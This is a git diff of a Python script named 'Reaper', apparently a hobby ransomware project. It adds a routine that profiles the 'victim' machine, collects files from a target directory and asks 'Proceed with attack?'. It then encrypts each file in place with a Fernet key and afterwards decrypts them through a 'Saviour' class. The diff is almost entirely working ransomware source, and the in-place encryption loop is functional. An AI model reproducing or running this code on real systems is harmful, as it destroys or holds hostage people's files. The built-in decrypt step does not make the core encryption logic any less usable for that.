@@ -2,6 +2,9 @@ import os
 from Victim import Victim
 from cryptography.fernet import Fernet
 from threading import Thread
+from Target_detection import Target_detection
+from Saviour import Saviour
+import time
 
 
 def generate_key():
@@ -14,25 +17,9 @@ def generate_key():
 
 
 class Reaper(Thread):
-    targets = []
 
-    def gather_targets(self, path=os.getcwd()):
-        for file in os.scandir(path):
-            name = file.path.split("\\")[-1]
-
-            if name == "Reaper.py" or name == "key.key" or name == "Saviour.py":
-                continue
-
-            if file.is_dir():
-                if name == "venv" or name == ".git" or name == "inspectionProfiles" or name == ".idea":
-                    continue
-                self.gather_targets(file)
-
-            else:
-                self.targets.append(file.path)
-
-    def encrypt(self, key):
-        for file in self.targets:
+    def encrypt(self, key, targets):
+        for file in targets:
             with open(file, "rb") as target_file:
                 plain_text = target_file.read()
                 cipher = Fernet(key).encrypt(plain_text)
@@ -43,25 +30,47 @@ class Reaper(Thread):
         print("Files locked.")
 
     def run(self):
-        # Get information regarding the target machine
         victim = Victim()
+        td = Target_detection(victim)
 
-        if victim.get_system() == "Windows":
-            print("Optimizing Reaper for Windows...")
-            # print("Locating targets...")
-            # self.gather_targets()
-            # print(self.targets)
+        print(
+            "[Victim's details]\n\n"
+            f"Targeted user: {victim.username}\n"
+            f"System: {victim.system}\n"
+            f"Machine: {victim.machine}\n"
+            f"Processor: {victim.processor}\n\n"
+            "--------------------------------\n"
+        )
 
-        elif victim.get_system() == "Linux":
-            print("Optimizing Reaper for Linux")
+        print("Locating targets...")
+        print(f"Targeted directory: {td.target_path}")
+        targets = td.gather_targets_windows()
+        # print(f"Targets: {targets}")
+        print(f"Target count: {len(targets)}")
 
-        # print("Generating key...")
-        # key = generate_key()
+        user_input = input("\nProceed with attack? [y/n]: ")
+
+        if user_input.lower() == "y":
+            print("Generating key...")
+            key = generate_key()
+            print("Encrypting files...")
+            self.encrypt(key, targets)
+
+            user_input = input("\nDecrypt files? [y/n]: ")
+
+            saviour = Saviour(targets)
+            if user_input.lower() == "y":
+                saviour.start()
+
+            else:
+                print("Screw you!")
+                time.sleep(0.8)
+                print(":)")
+                saviour.start()
+
+        else:
+            print("Aborted")
 
 
-
-        # print("Encrypting files...")
-        # self.encrypt(key)
-
-
-Reaper().start()
+if __name__ == '__main__':
+    Reaper().start()
